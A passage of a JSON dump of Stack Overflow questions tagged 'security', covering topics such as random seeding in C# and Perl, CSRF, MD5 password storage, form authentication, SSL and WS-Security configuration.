RNGCryptoServiceProvider();\n    byte[] buffer = new byte[4];\n\n    rng.GetBytes(buffer);\n    int result = BitConverter.ToInt32(buffer, 0);\n\n    return new Random(result).Next(min, max);\n}\n</code></pre>\n\n<p>Source: <a href=\"http://www.vcskicks.com/code-snippet/rng-int.php\" rel=\"nofollow\">http://www.vcskicks.com/code-snippet/rng-int.php</a></p>\n\n<p>Would this be preferred over using a tick count seed such as:</p>\n\n<pre><code>Random rand = new Random(Environment.TickCount); \nrand.Next(min, max);\n</code></pre>\n\n<p><strong>Note:</strong></p>\n\n<p><em>I am not looking for third party random data providers such as <a href=\"http://Random.org\" rel=\"nofollow\">Random.org</a>, as such a dependency is not realistic to the application.</em></p>\n"},{"tags":["database","security","internet","firebird","tunnel"],"answer_count":0,"favorite_count":3,"up_vote_count":7,"down_vote_count":0,"view_count":138,"score":7,"question_id":13007505,"title":"Best method to secure connection to firebird over internet","body":"<p>I have a client-server application which use a firebird server 2.5 over internet.\nI have met the problem of given a secure access to FB databases and as a first approch a tried to solve this problem by integrating a tunnel solution in the application (STunnel software more exactly). BUT, this approch suffer from many aspects :\n- this add more resource consumption (CPU, memory, threads) at both client/server side,\n- sotware deployment become a serious problem because STunnel software is writen as a WinNT Service, not a Dll or a Component (WinNT Service need administrator privileges for install)\nand my client application need to run without installation !</p>\n\n<p>SO, i decided to take the bull by the horn (or the bird by the feathers as we talk about Firebird). I have downloaded the Firebird 2.5 source code and injected secure tunnelization code directly in his low level communication layer (the INET socket layer).\nNOW, encryption/decryption is done directly by the firebird engine for each TCP/IP packet.</p>\n\n<p>What do you think about this approach vs external tunnelization ?</p>\n"},{"tags":["security","nginx"],"answer_count":5,"favorite_count":1,"up_vote_count":5,"down_vote_count":3,"view_count":2113,"score":2,"question_id":962230,"title":"Hide X-Powered-By (nginx)","body":"<p>So is there any way to hide X-Powered-By on Nginx?</p>\n"},{"tags":["php","security","file-upload"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":2,"view_count":61,"score":0,"question_id":13002692,"title":"Security issues from uploading files to the system","body":"<p>I understand that security issues usually come from user inputs which is why I am assuming there is a security hole in the else part of $eFlag!=1.<br>\nI am not familiar with php so I am not 100% sure what is going on here. </p>\n\n<p>I am assuming that file itself that is being uploaded could be some malicious executable and that is not being checked???\nIf so, is there ways to prevent uploading executable or just upload .doc files (looks like that's the file that the program wants)?</p>\n\n<p>***This was posted on one of the clubs that I am in for school and asked to identify a security hole (in another words, there is one for sure). </p>\n\n<p><img src=\"http://i.stack.imgur.com/hyACU.png\" alt=\"\"></p>\n"},{"tags":["java","security"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":39,"score":1,"question_id":13005319,"title":"managing certificate trust list with java source code","body":"<p>I am a new learner of java and I am testing Public Key Infrastructure with Java.</p>\n\n<p>And i have been searching for weeks, to manipulate certificate trust list with java source code. But i can't find the solution anywhere.</p>\n\n<p>Certificate Trust List (CTL) is a file extension with (.stl), which contain a list of Trusted Root Certification Authority.</p>\n\n<p>If anyone know how to manage certificate trust list in java, please share me.\nWith Regards,</p>\n"},{"tags":["security","web-security","csrf","csrf-protection"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":35,"score":0,"question_id":12739556,"title":"Do we need CSRF protection for public URLs","body":"<p>I have a web app, that does not have any forms (Disabled all form requests in web server).\nIt has only few public URLs ( with some GET params in URL). There is not login and it does not use any cookies.</p>\n\n<p>Do I need CSRF protection for this web app?</p>\n"},{"tags":["security","browser","autocomplete","passwords"],"answer_count":17,"favorite_count":33,"up_vote_count":107,"down_vote_count":1,"view_count":31536,"score":106,"question_id":32369,"title":"Disable browser 'Save Password' functionality","body":"<p>One of the joys of working for a government healthcare agency is having to deal with all of the paranoia around dealing with PHI (Protected Health Information). Don't get me wrong, I'm all for doing everything possible to protect people's personal information (health, financial, surfing habits, etc.), but sometimes people get a little too jumpy.</p>\n\n<p>Case in point: One of our state customers recently found out that the browser provides the handy feature to save your password. We all know that it has been there for a while and is completely optional and is up to the end user to decide whether or not it is a smart decision to use or not. However, there is a bit of an uproar at the moment and we are being demanded to find a way to disable that functionality for our site.</p>\n\n<p><strong>Question</strong>: Is there a way for a site to tell the browser not to offer to remember passwords? I've been around web development a long time but don't know that I have come across that before.</p>\n\n<p>Any help is appreciated.</p>\n\n<p>Thanks,\nMatt</p>\n"},{"tags":["iphone","security","ipad","ipod","jailbreak"],"answer_count":7,"favorite_count":37,"up_vote_count":23,"down_vote_count":0,"view_count":19082,"score":23,"question_id":5011774,"title":"Lock-down iPhone/iPod/iPad so it can only run one app","body":"<p>We'd like to 'lock-down' an iPhone/iPod/iPad so that the user can only run one app (we've developed this app internally). I'm guessing we'd be looking at jailbreaking, and then replacing (?) the default Springboard app... </p>\n\n<p>Can we do this? If so, how?</p>\n\n<p><strong>EDIT</strong> <em>Rick posted a great answer below. You can download a copy of a mobileconfig file from the URL below, if you visit this URL on your iOS device Safari will prompt you to install the profile. Don't forget to reboot your device :)</em></p>\n\n<p><a href=\"http://ipadhire.co.nz/res/lockdown.mobileconfig\" rel=\"nofollow\">http://ipadhire.co.nz/res/lockdown.mobileconfig</a></p>\n\n<p><strong>EDIT EDIT</strong> brainray posted below and pointed out that there's a new feature in iOS 6 called 'guided access' that allows you to lock a device to a specific app. It's a pity this feature wasn't available a year ago -- would have saved us a bit of hassle :)</p>\n"},{"tags":["mysql","security"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":36,"score":1,"question_id":13002027,"title":"Security issues of not checking data type","body":"<p><img src=\"http://i48.tinypic.com/2dhei4j.png\" alt=\"\"></p>\n\n<p>It doesn’t check for password type. Password may be defined as 4-digit unsigned ints and if a user attempts to change his/her password to something other than 4-digit unsigned ints, then it may cause errors, correct?</p>\n\n<p>If so, what kind of errors? \njust a simple error message or can this be a major security issue?\nCan someone buffer overflow attack on this?</p>\n"},{"tags":["c#","asp.net-mvc","security","asp.net-mvc-4","forms-authentication"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":71,"score":0,"question_id":13000770,"title":"forms authentication in mvc app, authenticating with external service","body":"<p>I am currently working on an MVC4 application where different types of users can visit the site and log in. There will be 2 different categorizations of users, type A and B where can access different areas of the site.</p>\n\n<p>Authentication of the user is via service call to an authentication provider and they will return a status of whether the user have been authenticated or not and the users information eg name, address etc. At this point I would like to track that the user is authenticated and what role they are in. Previously I would have created a cookie with the users name, address etc and stored on the clients machine. But this was open to manipulation as the cookies were plain text.</p>\n\n<p>But I would like to strengthen the security of the site and therefore looking at using FormsAuthentication. I am aware that generates a cookie but it is much more secure. </p>\n\n<p>Is this the correct approach and can the users information such as address etc be stored in this cookie? Session where I would like to store it is not available to me. How would I achieve this with FormsAuthentication?</p>\n\n<p>My second question is, once a user is logged in, how do I know the role that they are in?</p>\n\n<p>Finally, once a user is logged in, should the entire site by https? Even areas that are open to everyone but being visited by the logged in user? The logged in user will have information displayed on screen from them on every page eg Welcome John.</p>\n"},{"tags":["security","bluetooth","rfid","digital","drawer"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":41,"score":0,"question_id":12998586,"title":"small digital lock system - RFID WiFi or Bluetooth","body":"<p>Small Digital lock with RFID or Bluetooth activating system...</p>\n\n<p>Has someone worked with similar technologies in terms of hardware and software?</p>\n\n<p>Any idea will be very appreciated...</p>\n\n<p>Thanks</p>\n"},{"tags":["security","md5","reverse-engineering"],"answer_count":16,"favorite_count":8,"up_vote_count":27,"down_vote_count":2,"view_count":13889,"score":25,"question_id":1471654,"title":"Reversing an MD5 Hash","body":"<p>I have passwords stored in a database using <code>md5</code>, and was wondering if there was a way to reverse the hash to email the user's password to him in case they forget it.</p>\n\n<p>If that's not the most appropriate method, what is the appropriate method for dealing with a lost password?</p>\n"},{"tags":["php","security"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":265,"score":0,"question_id":6018270,"title":"prevent builtwith.com showing what my site is built with","body":"<p>Is there a way to mask my real server technology say from PHP to show up as Python when checked by sites like <a href=\"http://builtwith.com\" rel=\"nofollow\">http://builtwith.com</a>? Or at least to not show anything at all?</p>\n"},{"tags":["javascript","security","api","encryption","ssl"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":37,"score":0,"question_id":12993986,"title":"Javascript Client Authentication (with SSL, without OAuth2)?","body":"<p>The scenario is:</p>\n\n<p>I have a web API, which is being accessed by two clients:</p>\n\n<ul>\n<li>Web App written in Javascript, which is minified</li>\n<li>iOS App</li>\n</ul>\n\n<p>SSL is all set up on the server hosting the API, and it works fine. There is no User Auth for the API because it's a sort of location-based searching app.</p>\n\n<p>I want to ensure though that only the web app and the iPhone client are able to actually make requests to the API. For the iPhone client it's easy - a shared secret between the server and the app will do, and it's encrypted with SSL so we're not worried about people spying on it.</p>\n\n<p>But for the web app the same solution won't work. I can't just leave a string in the code, and even if it's encrypted in there that's all somebody would need.</p>\n\n<p>Basically, I'm looking for a good solution to this problem. I just want to make sure it's kept only to clients who are allowed to use it, but I'm not sure how I can without going and implementing OAuth which I think is probably overkill. Any ideas?</p>\n\n<p>Thanks!\nDan</p>\n"},{"tags":[".net","security","internet-explorer","exe"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":881,"score":2,"question_id":3579930,"title":"Force File Download prompt in IE for .NET executable?","body":"<p>We have a .NET executable that we are hosting on a web server.  The domain for the web server is set as a \"Trusted Site\" on the user's IE.</p>\n\n<p>When the user left clicks the link for the executable, it blows up with the error: \"Microsoft IE Execute shell has encountered a problem and needs to close\".  From what I have read, it is because IE is trying to execute the file directly using ieexec.exe.</p>\n\n<p>What is desired, is the user should get a pop-up box with a security warning asking them if they want to download the .exe, and buttons \"Run\" \"Save\" \"Cancel\".  Not a cryptic security exception. The workaround is to right-click and click on \"Save Target As..\". </p>\n\n<p>Of course, this only blows up in IE, not Firefox or Chrome.</p>\n\n<p>How can I compile the .NET executable to bypass this ieexec.exe and force the file download prompt?</p>\n"},{"tags":["jquery","asp.net-mvc","security","architecture"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":93,"score":1,"question_id":8277818,"title":"widget development","body":"<p>i develop a asp.net mvc3 shop application which is multi tenant. Each customer (around 1000 sites) has a own website where he likes to embed this solution. I use a extended validation SSL as this increases customer thrust.</p>\n\n<p>so far i use iframes, which is not a good choice as on the payment step the customer does not see that the connection is SSL encrypted. so i choosed to put the page complete behind ssl and the page of the customer is ssl too. this is a unsatisfying approach, as i have problems with scrollbars, positioning of lightboxes etc. </p>\n\n<p>my new approach would use asp.net mvc3 to provide controllers which deliver json results; on the client side i want to use a jquery based mvc framework together with jquery templates.</p>\n\n<p>my question is, how should i handle SSL to let the customer see the traffic is encrypted? I want to avoid that customers need to create a proxy and route the traffic through their ssl certificate as many different CMS systems are involved so i can't provide a simple \"how-to\" to the customer.</p>\n"},{"tags":["xml","security","axis2","rampart"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":1139,"score":2,"question_id":4609669,"title":"\"Missing wsse:Security header in request\" when I try posting a SOAP message with Axis2 and Rampart","body":"<p>I feel like I've been looking at this issue forever.\nBackground:\nI have to call a secured third party web service.  The body and a header block both need to be signed with a client certificate.\nIf I disable Rampart and use tcpmon and capture the outgoing envelope, I can configure SOAPUI to send the message (by configuring SOAPUI to use the cert to sign the important parts discussed earlier).  That tells me the message isn't the issue.</p>\n\n<p>If I enable Rampart and capture the outgoing message, it looks correct (the two elements are signed, the security elements are all in place).</p>\n\n<p>I get the following stack when I try calling the service with Rampart:</p>\n\n<p>org.apache.axis2.AxisFault: Missing wsse:Security header in request\n    at org.apache.rampart.handler.RampartReceiver.setFaultCodeAndThrowAxisFault(RampartReceiver.java:166)\n    at org.apache.rampart.handler.RampartReceiver.invoke(RampartReceiver.java:99)\n    at org.apache.axis2.engine.Phase.invoke(Phase.java:318)\n    at org.apache.axis2.engine.AxisEngine.invoke(AxisEngine.java:254)\n    at org.apache.axis2.engine.AxisEngine.receive(AxisEngine.java:160)\n    at org.apache.axis2.description.OutInAxisOperationClient.handleResponse(OutInAxisOperation.java:364)\n    at org.apache.axis2.description.OutInAxisOperationClient.send(OutInAxisOperation.java:417)\n    at org.apache.axis2.description.OutInAxisOperationClient.executeImpl(OutInAxisOperation.java:229)\n    at org.apache.axis2.client.OperationClient.execute(OperationClient.java:165)\n    at org.apache.axis2.axis2userguide.RetrieveCurrentBidResults_v20090801ServiceStub.retrieveCurrentBidResults_v20090801(RetrieveCurrentBidResults_v20090801ServiceStub.java:225)\n    at org.transalta.weezer.soap.client.RetrieveCleanBidsClient.main(RetrieveCleanBidsClient.java:64)</p>\n\n<p>and here is the policy.xml file I'm using:</p>\n\n<pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;wsp:Policy wsu:Id=\"SigEncr\"\nxmlns:wsu=\"http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd\"\nxmlns:wsp=\"http://schemas.xmlsoap.org/ws/2004/09/policy\"&gt;\n&lt;wsp:ExactlyOne&gt;\n    &lt;wsp:All&gt;\n        &lt;sp:AsymmetricBinding\n            xmlns:sp=\"http://schemas.xmlsoap.org/ws/2005/07/securitypolicy\"&gt;\n            &lt;wsp:Policy&gt;\n                &lt;sp:InitiatorToken&gt;\n                    &lt;wsp:Policy&gt;\n                        &lt;sp:X509Token\n                            sp:IncludeToken=\"http://schemas.xmlsoap.org/ws/2005/07/securitypolicy/IncludeToken/AlwaysToRecipient\"&gt;\n                            &lt;wsp:Policy&gt;\n                                &lt;sp:RequireThumbprintReference /&gt;\n                                &lt;sp:WssX509V1Token10 /&gt;\n                            &lt;/wsp:Policy&gt;\n                        &lt;/sp:X509Token&gt;\n                    &lt;/wsp:Policy&gt;\n                &lt;/sp:InitiatorToken&gt;\n                &lt;sp:RecipientToken&gt;\n                    &lt;wsp:Policy&gt;\n                        &lt;sp:X509Token\n                            sp:IncludeToken=\"http://schemas.xmlsoap.org/ws/2005/07/securitypolicy/IncludeToken/Never\"&gt;\n                            &lt;wsp:Policy&gt;\n                                &lt;sp:RequireThumbprintReference /&gt;\n                                &lt;sp:WssX509V3Token10 /&gt;\n                            &lt;/wsp:Policy&gt;\n                        &lt;/sp:X509Token&gt;\n                    &lt;/wsp:Policy&gt;\n                &lt;/sp:RecipientToken&gt;\n                &lt;sp:AlgorithmSuite&gt;\n                    &lt;wsp:Policy&gt;\n                        &lt;sp:TripleDesRsa15 /&gt;\n                    &lt;/wsp:Policy&gt;\n                &lt;/sp:AlgorithmSuite&gt;\n                &lt;sp:Layout&gt;\n                    &lt;wsp:Policy&gt;\n                        &lt;sp:Strict /&gt;\n                    &lt;/wsp:Policy&gt;\n                &lt;/sp:Layout&gt;\n                &lt;sp:OnlySignEntireHeadersAndBody /&gt;\n            &lt;/wsp:Policy&gt;\n        &lt;/sp:AsymmetricBinding&gt;\n        &lt;sp:Wss10 xmlns:sp=\"http://schemas.xmlsoap.org/ws/2005/07/securitypolicy\"&gt;\n            &lt;wsp:Policy&gt;\n                &lt;sp:MustSupportRefKeyIdentifier /&gt;\n                &lt;sp:MustSupportRefIssuerSerial /&gt;\n            &lt;/wsp:Policy&gt;\n        &lt;/sp:Wss10&gt;\n        &lt;sp:SignedParts xmlns:sp=\"http://schemas.xmlsoap.org/ws/2005/07/securitypolicy\"&gt;\n            &lt;sp:Body /&gt;\n            &lt;sp:Header Name=\"CAISOWSHeader\" Namespace=\"http://www.caiso.com/soa/2006-09-30/CAISOWSHeader.xsd\" /&gt;\n        &lt;/sp:SignedParts&gt;\n    &lt;/wsp:All&gt;\n&lt;/wsp:ExactlyOne&gt;\n&lt;/wsp:Policy&gt;\n</code></pre>\n\n<p>So what I want to know is what the heck is Rampart trying to tell me?  I know the component it doesn't think is present IS there.</p>\n"},{"tags":["perl","security","random","reverse-engineering","srand"],"answer_count":1,"favorite_count":0,"up_vote_count":5,"down_vote_count":0,"view_count":176,"score":5,"question_id":12497045,"title":"What are the weaknesses of Perl's srand() default seed, post version 5.004?","body":"<p>I can find plenty of documentation as to issues with use of <code>time()</code> prior to Perl version 5.004, but nothing following.</p>\n\n<p>For a homework assignment, we are asked to reverse-engineer a program's results based on the assumption that the default Perl <code>srand()</code> is still flawed in default seeding. The <a href=\"http://perldoc.perl.org/perl5004delta.html#New-and-changed-builtin-functions\">changelog for the perl 5.004 release</a> states that the <code>srand()</code> default seed is now based on \"a heavy mix of difficult-to-predict system-dependent values.\"</p>\n\n<p>Is that the case, and, if so, what are those values and do they have any inherent weaknesses?</p>\n"},{"tags":["asp.net","asp.net-mvc","security","reflection","permissions"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":69,"score":0,"question_id":12972937,"title":"Assign custom class permissions check for controller actions in ASP.NET MVC4","body":"<p>I have an ASP.NET MVC4 site with custom user/role provider. Entity Framework works with the user and role entities at the bottom level. Now I am introducing a concept of <code>RolePermission</code>s. Each role has an asscocialted list of permissions that allow users in this role to perform certain actions within the system, like deleting comments for example. </p>\n\n<p>In my custom-build admin panel I want to list all the actions of a controllers and have an ability to allow or disallow the call to some action based on the presenace of a permission in the curent user's role.</p>\n\n<p>Questions are:</p>\n\n<ol>\n<li>Is it possible?</li>\n<li>How do I list a set of actions in the controller.</li>\n<li>How do I assign or cancel an association between action and a role permission.</li>\n</ol>\n\n<p>Possible starategy:</p>\n\n<p>I introduce a global custom filter that is applied to all of the controllers and actions, that checks my database to see If I have a logical association. This way a checking code is ran every time the user makes a call to an action. Still how do I list controllers and actions (via reflection perhaps?)</p>\n"},{"tags":["facebook","security","web-applications","secure-coding"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":37,"score":1,"question_id":12990448,"title":"Facebook image URLs - how are they kept from un-authorised users?","body":"<p>I'm interested in social networks and have stumbled upon something which makes me curious.</p>\n\n<p>How does facebook keep people from playing with URLs and gaining access to photos they should not?</p>\n\n<p>Let me expand, here's an altered example of a facebook image URL that came up on my feed-</p>\n\n<p><a href=\"https://fbcdn-sphotos-g-a.akamaihd.net/hphotos-ak-prn1/s480x480/\" rel=\"nofollow\">https://fbcdn-sphotos-g-a.akamaihd.net/hphotos-ak-prn1/s480x480/</a>{five_digit_number}_{twelve_digit_number}_{ten_digit_number}_n.jpg</p>\n\n<p>So, those with more web application experience will presumably know the answer to this, I suspect it's well understood, but what is to stop me from changing the numbers and seeing other people's photos that possibly I'm not supposed to?</p>\n\n<p>[I understand that this doesn't work, I'm just trying to understand how they maintain security and avoid this problem]</p>\n\n<p>Many thanks in advance,</p>\n\n<p>Nick</p>\n"},{"tags":["java","security","authentication","web-applications","jboss7.x"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":73,"score":-1,"question_id":12962653,"title":"403 after successful form authentication","body":"<p>I'm using form based authentication in a webapp on JBoss 7, backed by an LdapLoginModule.</p>\n\n<pre><code>&lt;security-constraint&gt;\n    &lt;web-resource-collection&gt;\n        &lt;web-resource-name&gt;Protected Resources&lt;/web-resource-name&gt;\n        &lt;url-pattern&gt;/*&lt;/url-pattern&gt;\n    &lt;/web-resource-collection&gt;\n    &lt;auth-constraint&gt;\n        &lt;role-name&gt;*&lt;/role-name&gt;\n    &lt;/auth-constraint&gt;\n    &lt;user-data-constraint&gt;\n        &lt;transport-guarantee&gt;NONE&lt;/transport-guarantee&gt;\n    &lt;/user-data-constraint&gt;\n&lt;/security-constraint&gt;\n&lt;login-config&gt;\n    &lt;auth-method&gt;FORM&lt;/auth-method&gt;\n    &lt;realm-name&gt;ldap&lt;/realm-name&gt;\n    &lt;form-login-config&gt;\n        &lt;form-login-page&gt;login.html&lt;/form-login-page&gt;\n        &lt;form-error-page&gt;login.html&lt;/form-error-page&gt;\n    &lt;/form-login-config&gt;\n&lt;/login-config&gt;\n</code></pre>\n\n<p>On accessing / I'm sent to login.html and if I put an invalid password in then to /j_security_check. If I put the correct password in though I'm sent to / but get the following error in the browser:</p>\n\n<pre><code>HTTP Status 403 - Access to the requested resource has been denied\n</code></pre>\n\n<p>Why would I be being denied access to the index.html after successfully negotiating the login form? There's no sign of any log output.</p>\n"},{"tags":["security","drupal","hack"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":3,"view_count":29,"score":-3,"question_id":12991498,"title":"Drupal Website Best Security Practices","body":"<p>I'd like to know what are the best practices to secure a Drupal website </p>\n"},{"tags":["php","javascript","arrays","json","security"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":79,"score":0,"question_id":12990705,"title":"Javascript to PHP Security","body":"<p>I can't seem to find an almost exact question so I might as well ask away.</p>\n\n<p>Is it really a standard practice to send variables from Javascript to PHP? I'm planning to send array to PHP after some several assessment within Javascript - passing variables here and there...only to be combined again as an array, and as I've said, will be passed to PHP. Am I missing something? I hardly see any tutorials to do this, mostly the other way around - that is, PHP array to Javascript. Makes me think, maybe it just isn't being advised to do Javascript to PHP due to security reasons.</p>\n\n<p>Simply put, will sending Javascript array to PHP that will later on be saved to database be dangerous? I haven't really FULLY read how to do it, just scanned the very few that I could find...json stringify, $_POST, json encode, json decode. If it is fine to do JS to PHP passing, and since it is related to my question anyway, can someone point me which of those mentioned is best for better security? Thanks!</p>\n"},{"tags":["php","security","http","httpwebrequest","bots"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":74,"score":0,"question_id":12989532,"title":"How to have app use a private .php webpage?","body":"<p>I want my desktop app to hit a <code>.php</code> page on my web site.  The <code>.php</code> page will perform a server side task and will return an HTTP response indicating success/failure etc.</p>\n\n<p>How can I ensure only my desktop app will be able to access the <code>.php</code> page?  How can I prevent bots, crawlers and hackers from accessing the page?</p>\n\n<p>Should I have a random phrase in the URL? eg:</p>\n\n<pre><code>http://www.website.com/s3g8k0d1q6/myphpfile.php\n</code></pre>\n"},{"tags":["c#",".net","security","internet-explorer"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":89,"score":2,"question_id":7956275,"title":"Is is possible to elevate security in IE .NET Add-on?","body":"<p>I have a C#/.NET (VS2010) IE add-on which uses <code>Marshal.GetActiveObject()</code> to a running instance of an application (COM object) and then send commands to it via the <code>Invoke()</code> method. In XP it works fine. In W7/Vista, it requires both IE and the target application to be \"Run as Administrator\" or else it generates the exception:</p>\n\n<pre><code>[Operation unavailable (Exception from HRESULT:0x8000401E3 MK_E_UNAVAILABLE))]\n</code></pre>\n\n<p>Here's the code:</p>\n\n<pre><code>private void _BtnPlace_onclick(IHTMLEventObje)\n{\n    ....\n    ....\n    object AutoCADApp = null;\n    try\n    {\n        // Does not return the object from the Running Objects Table unless run 'As Administrator'\n\n        AutoCADApp = System.Runtime.InteropServices.Marshal.GetActiveObject(\"AutoCAD.Application\");\n    }  \n    catch (Exception ex)\n    {\n        MessageBox.Show(\"Unable to locate a running version of AutoCAD on this machine. Please make sure AutoCAD is running.\\n\\n [\" + ex.Message + \"]\\n\", \"Error\", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);\n        return;\n     } \n\n    object acadDoc = GetProperty(AutoCADApp, \"ActiveDocument\");\n    InvokeMethod(acadDoc, \"SendCommand\", keyin);\n}\n</code></pre>\n\n<p>Any ideas on how to address the security issues to make this add-on run in W7/Vista (asking it to prompt for elevated privileges is ok)?</p>\n"},{"tags":["security","ssl","https","web-security"],"answer_count":5,"favorite_count":3,"up_vote_count":3,"down_vote_count":0,"view_count":2939,"score":3,"question_id":4495570,"title":"To use or not to use SSL? Why use SSL always?","body":"<p>The argument for using SSL is to prevent some malicious user who has gone through the pains of snooping your traffic being able to read your traffic. So while it may make sense if you are using an unsecured wireless (non WPA2) network to use SSL when logging on to your bank account or giving your credit card number, I find it difficult to see it's neccessaity in more common business cases. </p>\n\n<p>Why even bother with SSL?  (when your client is not going to be on an unsecured wireless network)</p>\n\n<p>The only way someone can snoop your particular HTTP connections and data therein is if they have admin access to your router (and then only if there is some facility to monitor/copy traffic), installed some tool on your machine (a key logger of course would by pass SSL anyway) or they monitor you at the ISP (for which a warrant is required in most jurisdictions).</p>\n\n<p><strong>Update Warning</strong> Some jurisdictions are not as free as you may think, particularly the 1st and 2nd world, e.g. in the UK, government may soon not require a warrant: <a href=\"http://en.wikipedia.org/wiki/Communications_Data_Bill_2008\" rel=\"nofollow\">http://en.wikipedia.org/wiki/Communications_Data_Bill_2008</a> which will probably entail the ability to read websites as they were historically (i.e. decrypt SSL) and the US's \"Patriot Act\" <a href=\"http://en.wikipedia.org/wiki/US_Patriot_Act#Title_II:_Surveillance_procedures\" rel=\"nofollow\">http://en.wikipedia.org/wiki/US_Patriot_Act#Title_II:_Surveillance_procedures</a></p>\n\n<p>Furthermore:</p>\n\n<ul>\n<li>Accepting SSL connections server side adds significant load as the establishing of a connection is processor intensive (during the generation of secret keys).</li>\n<li>Publicly trusted SSL certificates have to be purchased from a 3rd Party periodically </li>\n</ul>\n\n<p><strong>UPDATE:</strong> I am actually using SSL, though I thought it worthwhile to ask the question anyway. Certainly I think there are time SSL is not necessary. Maybe this could be turned into a community wiki of the pros and cons of SSL? If so how?</p>\n\n<p>There seems to be commonly occurring myth in the answers below: \"anyone between you and the server can eavesdrop on you\"... </p>\n\n<ul>\n<li>This is not not possible on the Internet as the low level TCP routers only forward packets where they have to go and even in the same session can be routed through different routes, and no one can look at these packets except in extreme cases - technically or lawfully.\n</li> \n<li>\nAs for someone at the ISP looking at your traffic I wonder why they would signal you out and look at the 'so important data' which no doubt is boring to them, this is also illegal without a warrant. \n<li>\nOn your LAN (except wireless) unless you are using a dinosaur Hub which broadcasts every packet there is no way listen on someone else's traffic - this is not possible because the hardware simply does not send the packets to you even if you have your network card in promiscuous mode and are using a sniffing tool such as Snort or Wireshark. \n</li>\n</ul>\n\n<p>Passive ARP poisoning is one way to  listen in but has to be done internally and should be picked up as name conflicts etc. start occuring and often the default gateway would be static so would be v. difficult cause the default gateway will be on before you.</p>\n"},{"tags":["flex","security","certificate"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":208,"score":1,"question_id":8586411,"title":"Flex Certificate .crt file into ByteArray for secureSocket calss addBinaryChainBuildingCertificate method","body":"<p>I have a certificate file which I want to import into flex application to establish a secure socket connection with a sever. But I am a getting an exception which says <code>ArgumentError: Error #2004: One of the parameters is invalid</code>.</p>\n\n<pre><code>var urlLoader:URLLoader = new URLLoader();\nvar request:URLRequest = new URLRequest(\"xyz.crt\");\nurlLoader.addEventListener(Event.COMPLETE, doEvent);\nurlLoader.dataFormat = URLLoaderDataFormat.BINARY;\nurlLoader.load(request);\n\nprivate function doEvent(evt:Event):void {\nvar ldr:URLLoader = evt.target as URLLoader;\nsecureSocket.addEventListener( Event.CONNECT, onConnect )\nsecureSocket.addEventListener( IOErrorEvent.IO_ERROR, onError );\ntry{\nsecureSocket.addBinaryChainBuildingCertificate(ldr.data,true );\nsecureSocket.connect( \"192.168.2.100\", 443 );\n\n}\ncatch ( error:Error )\n{\nAlert.show( error.toString() );\n}\n}\n</code></pre>\n"},{"tags":["php","security","login","captcha"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":156,"score":3,"question_id":12235619,"title":"Enable Captcha after several login failure - How to implement this?","body":"<p>I'm working on an auth system with login failure.<br>\nIf the user fails to login, the attempts number in database is incremented and if a defined limit is reached, PHP sets a session captcha variable to true.<br>\nSo when the user (or spam bot) gets the login page again, a captcha form is shown thanks to the session variable</p>\n\n<p>But since Spam bots could eventually delete the session cookie and retry, this may be not  effective.</p>\n\n<p>Should I use a database solution instead ? How would you implement this (with/or without the database) ?</p>\n"},{"tags":["linux","security","svn"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":41,"score":1,"question_id":12987974,"title":"Keeping Linux configuration files in SVN (Subversion)","body":"<p>How good is the idea of ​​preserving the <strong>Linux</strong> configuration files in version control system (<strong>SVN</strong>, for example)? For example, to see all changes in the firewall, change history. In particular, it is possible to keep these groups of files -</p>\n\n<ul>\n<li>Access files</li>\n<li>Booting and login / logout</li>\n<li>File system</li>\n<li>System administration</li>\n<li>Networking</li>\n<li>System commands</li>\n<li>Daemons</li>\n</ul>\n\n<p>...</p>\n\n<p>Ie For example, I am making changes to the firewall and do commit the file to the repository. Then, if something goes not so, I can extract the file and compare it to that is. This can help detect some unauthorized access.</p>\n"},{"tags":["security","ssl","https","cryptography"],"answer_count":4,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":783,"score":3,"question_id":5864161,"title":"Alternatives to SSL","body":"<p>So over the last few years it seems like SSL has taken rather a beating from the security community. While the technical reasons are beyond my understanding, I understand the concepts and understand that SSL is becoming more and more insecure as new weaknesses are found.</p>\n\n<p>My question to you guys is this:\nIf SSL is \"broken\", is there a technology that can take its place? Is there a more secure alternative?</p>\n\n<p>Any thoughts are appreciated! :)</p>\n\n<p>(ps, I'm not specifically talking about HTTPS - I mean any SSL technology)</p>\n"},{"tags":["php","web-services","security","curl","dns"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":26,"score":0,"question_id":12987652,"title":"Reliably detect caller domain over cURL request?","body":"<p>OK so server-side security is not my forte. Basically, I'm building a service which users may use (via an SDK) only on the domain they stipulated when they signed up.</p>\n\n<p>The SDK calls my web service over cURL in PHP.</p>\n\n<p>Would I be right in thinking I cannot reliably detect the caller domain, i.e. enforce that it is the same domain they stipulated 